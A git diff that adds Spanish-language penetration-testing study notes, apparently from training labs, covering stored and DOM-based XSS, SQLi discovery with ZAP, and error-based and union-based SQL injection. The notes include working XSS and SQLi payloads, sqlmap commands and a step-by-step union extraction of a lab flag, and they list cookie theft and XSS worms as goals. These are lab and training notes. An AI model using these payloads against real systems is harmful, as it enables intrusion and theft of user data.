@@ -1486,11 +1486,76 @@ searchsploit Relevanssi
 #### Identifying & Exploiting Stored XSS Vulnerabilities
 
 ```bash
+# XSS Stored
+# El payload SÍ se guarda en el servidor/base de datos (a diferencia del
+# Reflected). Se ejecuta cada vez que la víctima carga la página/sección
+# donde quedó almacenado
+
+# Instalación de dependencias y herramienta
+git clone <repo-mybbscan>       # clonar repositorio de MyBBscan
+pip install huepy                # instalar dependencia huepy
+
+cd MyBBscan  
+./scan.py # Escaneo con MyBBscan
+# se ingresa la URL del foro target cuando lo solicite
+
+# Alternativa: buscar el plugin/versión vulnerable directamente en exploit-db
+# y revisar el PoC correspondiente
+
+# Payload de prueba encontrado:
+<BODY ONLOAD=alert('XSS')>
+
+# Se inyecta el payload en un campo del foro (post, perfil, firma, etc.)
+# que no sanitiza el input. Al guardarse y cargarse la página nuevamente
+# se ejecuta el alert() -> confirma el Stored XSS
+
+# Qué se puede lograr con un Stored XSS (impacto generalmente MAYOR que
+# el Reflected, ya que afecta a TODOS los usuarios que vean el contenido):
+# - Robo masivo de cookies de sesión de todos los usuarios que visiten
+#   el post/página infectada (incluyendo administradores)
+# - Propagación de malware o redirecciones automáticas a phishing
+# - Creación de gusanos XSS (self-propagating) si el payload también
+#   se auto-replica al postear en nombre de la víctima
+# - Compromiso persistente sin depender de ingeniería social por link
 ```
 
 #### Identifying & Exploiting DOM-Based XSS Vulnerabilities
 
 ```bash
+# XSS DOM-Based
+# El payload nunca viaja al servidor ni se guarda en él — todo el ataque
+# ocurre en el lado del cliente (navegador), manipulando directamente el
+# DOM/JavaScript de la página. El servidor entrega el mismo HTML/JS
+# siempre; es el propio código JS del cliente el que procesa un dato
+# controlado por el atacante (ej: la URL) de forma insegura
+
+# Target: demo.ine.local
+
+# Al revisar el código fuente HTML se encuentra:
+<script>
+    var statement = document.URL.split("statement=")[1];
+    document.getElementById("result").innerHTML = eval(statement);
+</script>
+
+# Línea 1: lee la URL completa y guarda todo lo que venga después de
+#          "statement=" (el atacante controla ese fragmento vía la URL)
+# Línea 2: ejecuta ese valor como código JS usando eval() -> ahí está
+#          el fallo, no se sanitiza ni valida el input antes de ejecutarlo
+
+# Payload de prueba (robo de cookies) directo en la URL:
+alert(document.cookie)
+
+# Se agrega como valor del parámetro statement en la URL, se carga la
+# página y el JS del cliente ejecuta el alert() mostrando las cookies
+# de sesión -> confirma el DOM-Based XSS
+
+# Qué se puede lograr con un DOM-Based XSS:
+# - Robo de cookies de sesión sin que el payload pase por el servidor
+#   (dificulta su detección en logs del backend/WAF)
+# - Ejecución de cualquier JS arbitrario en el contexto de la víctima
+#   (redirecciones, keylogging, acciones en su nombre, etc.)
+# - Al no tocar el servidor, muchas defensas del lado backend
+#   (sanitización, WAF a nivel servidor) no detectan ni bloquean el ataque
 ```
 
 ### ~ SQLi
@@ -1498,16 +1563,145 @@ searchsploit Relevanssi
 #### Finding SQL Injection Vulnerabilities
 
 ```bash
+# Finding SQLi con OWASP ZAP
+# ZAP permite automatizar la búsqueda de SQLi lanzando múltiples payloads
+# (fuzzing) contra los parámetros de la app, para detectar respuestas
+# anómalas (errores de DB, diferencias de tiempo/contenido) que indiquen
+# una inyección exitosa
+
+# Flujo:
+# 1. Se interceptan/identifican los parámetros de la app (forms, URL params)
+# 2. Se usa el fuzzer de ZAP para probar una lista de payloads SQLi
+#    contra esos parámetros de forma automatizada
+# 3. Se revisan las respuestas en busca de indicadores de SQLi
+#    (errores de sintaxis SQL, cambios en el comportamiento de la app, etc.)
+
+# Repositorio de payloads usado para pruebas manuales/complementarias:
+# https://github.com/payload-box/sql-injection-payload-list
+# Contiene listas de payloads ya armados para distintos motores de DB
+# y técnicas (auth bypass, union-based, error-based, etc.), útiles para
+# probar manualmente en la web cuando el fuzzing automático no es claro
+
+# Qué se puede lograr al confirmar un punto de inyección con este método:
+# - Identificar rápidamente qué parámetros son vulnerables antes de
+#   pasar a la fase de explotación (Error-Based, Union-Based, etc.)
+# - Ahorrar tiempo probando decenas de payloads de forma automatizada
+#   en vez de manualmente uno por uno
 ```
 
 #### Exploiting Error-Based SQL Injection Vulnerabilities 
 
 ```bash
+# In-Band SQLi: el atacante envía el ataque y recibe el resultado por
+# el mismo canal (misma respuesta HTTP)
+# Error-Based (subtipo de In-Band): fuerza errores en la DB para que
+# el mensaje de error revele información del schema/contenido
+
+# LAB: PHPMyRecipes - Error-Based SQLi
+
+# Búsqueda del exploit
+searchsploit PHPMyRecipes SQL injection
+# Encontrado:
+# Vulnerable web page:  /dosearch.php
+# Vulnerable parameter: words_exact
+
+sqlmap -u "http://demo.ine.local/dosearch.php" --data "words_exact=" -p words_exact --method POST
+
+# Preguntas interactivas de sqlmap:
+# "Do you want to skip test payloads specific for other DBMSes?"        -> y
+# "do you want to include all tests for 'MySQL' extending provided      -> y
+#  level (1) and risk (1) values?"
+# "Do you want to keep testing the others (if any)?"                    -> n
+# (ya con MySQL confirmado, no hace falta seguir probando otros DBMS)
+
+# sqlmap identifica y confirma 3 tipos de payloads explotables:
+
+# Type: error-based
+words_exact=' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767171,(SELECT (ELT(9194=9194,1))),0x7178627171,0x78))s), 8446744073709551610, 8446744073709551610)))#
+
+# Type: time-based blind
+words_exact=' IN BOOLEAN MODE) AND (SELECT 4679 FROM (SELECT(SLEEP(5)))oAuq)#
+
+# Type: UNION query
+words_exact=' IN BOOLEAN MODE) UNION ALL SELECT NULL,CONCAT(0x716a767171,0x52536f4563764f69547a756f524a67796a476e725175444d6c56696753475a68755a564d6c6f4879,0x7178627171)#
+
+# En el inspector del navegador, ubicar el input "words_exact" y
+# eliminar el atributo maxlength (el campo del form limita caracteres
+# y el payload es más largo que el límite por defecto)
+
+# Se inyecta el payload error-based directamente en el campo del form:
+' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767171,(SELECT (ELT(9194=9194,1))),0x7178627171,0x78))s), 8446744073709551610, 8446744073709551610)))#
+
+# El mensaje de error de la DB confirma la inyección
+
+# Se modifica el payload para extraer la versión del servidor MySQL
+# usando la función version():
+' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178626a71,(SELECT (ELT(1595=1595,1))),0x7178707071,version()))s), 8446744073709551610, 8446744073709551610)))#
+
+# El error de la DB ahora incluye la versión de MySQL en su mensaje
+
+# Qué se puede lograr con Error-Based SQLi:
+# - Extraer datos arbitrarios de la DB (versión, nombres de tablas,
+#   columnas, contenido) leyendo únicamente los mensajes de error
+# - Mapear el schema completo de la base de datos sin necesidad de
+#   una respuesta "limpia" en la página (solo con el error se filtra info)
+# - Con herramientas como sqlmap, automatizar todo el proceso hasta
+#   volcar (dump) tablas completas de la base de datos
 ```
 
 #### Exploiting Union-Based SQL Injection Vulnerabilities
 
 ```bash
+# SQL Injection Union-Based - Recordatorio rápido
+# Explota el operador UNION para combinar una consulta maliciosa con la
+# consulta original y así extraer datos de OTRAS tablas de la base de
+# datos, dentro del mismo resultado que devuelve la app
+# Requisito: el número de columnas y tipos de dato deben coincidir entre
+# el SELECT original y el inyectado
+
+# Target: http://results.abc.univ.edu:5000
+
+# Paso 1: probar si el campo es vulnerable a SQLi
+# Payload (confirma inyección forzando una condición siempre verdadera):
+a' or '1'='1' --
+# Al ser TRUE, la query devuelve TODOS los registros de la tabla
+
+# Paso 2: determinar el número de columnas con UNION SELECT
+# Se va probando con distinta cantidad de columnas hasta que la
+# query no dé error (deben coincidir con las columnas originales)
+a' or '1'='1' union select 1 --
+a' or '1'='1' union select 1,2,3 --
+a' or '1'='1' union select 1,2,3,4,5 --
+# La tabla tiene 5 columnas (esta última no da error)
+# Nota: la columna 2 nunca se muestra en la respuesta -> no sirve
+# para extraer datos, hay que usar otra columna visible
+
+# Paso 3: obtener la versión del motor de base de datos (SQLite)
+a' or '1'='1' union select sqlite_version(),2,3,4,5 --
+# Resultado: SQLite version 3.22.0
+
+# Paso 4: enumerar tablas del esquema (sqlite_master)
+a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
+# Se identifican 2 tablas: results y secret_flag
+
+# Obtener el SQL usado para crear las tablas (columna "sql" del schema):
+a' or '1'='1' union select sql,2,3,4,5 from sqlite_master --
+# Las últimas 2 entradas muestran el CREATE TABLE de results y
+# secret_flag -> revela nombres de columnas de cada tabla
+
+# Paso 5: extraer la flag secreta
+a' or '1'='1' union select flag,2,value,4,5 from secret_flag --
+# Se usa la columna 3 (no la 2, porque esa nunca se refleja en la
+# respuesta como se vio en el paso 2) para mostrar el valor "value"
+# de la tabla secret_flag
+
+# Qué se puede lograr con Union-Based SQLi:
+# - Extraer datos de CUALQUIER tabla de la base de datos (no solo la
+#   que consulta la app), incluyendo tablas ocultas o de sistema
+# - Enumerar el esquema completo (nombres de tablas, columnas, tipos)
+#   sin acceso directo a la base de datos
+# - Robar información sensible almacenada en otras tablas (credenciales,
+#   flags, datos de otros usuarios, etc.) en una sola consulta combinada
 ```
 
 ## 04 - Network Penetration Testing
